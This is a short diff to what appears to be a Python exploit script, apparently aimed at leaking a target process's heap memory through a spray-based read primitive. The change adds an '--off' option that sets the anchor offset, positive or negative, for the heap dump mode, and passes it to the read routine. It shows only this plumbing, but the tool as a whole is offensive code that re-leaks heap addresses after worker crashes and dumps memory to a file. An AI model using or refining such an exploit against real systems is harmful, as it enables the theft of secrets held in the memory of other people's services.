@@ -443,7 +443,7 @@ def mode_dump(t: Target, args):
     total = 0
     L = args.read_len
     for pg in range(args.pages):
-        r = read_via_spray(t, S, L=L)
+        r = read_via_spray(t, S, off=args.off, L=L)
         if r is None:
             log("~", f"stream page {pg}: worker died, re-leaking")
             hr = heap_leak(t)
@@ -714,6 +714,8 @@ def main():
     p.add_argument("--out", default="heap.dump", help="dump output path")
     p.add_argument("--pages", type=int, default=256)
     p.add_argument("--back-pages", type=int, default=64)
+    p.add_argument("--off", type=lambda x: int(x, 0), default=0x38,
+                   help="dump mode: anchor offset from S (negative reads backward)")
     p.add_argument("--read-len", type=lambda x: int(x, 0), default=0x4000,
                    help="dump mode: bytes per self-anchored read")
     p.add_argument("--addr", type=lambda x: int(x, 16), default=None)
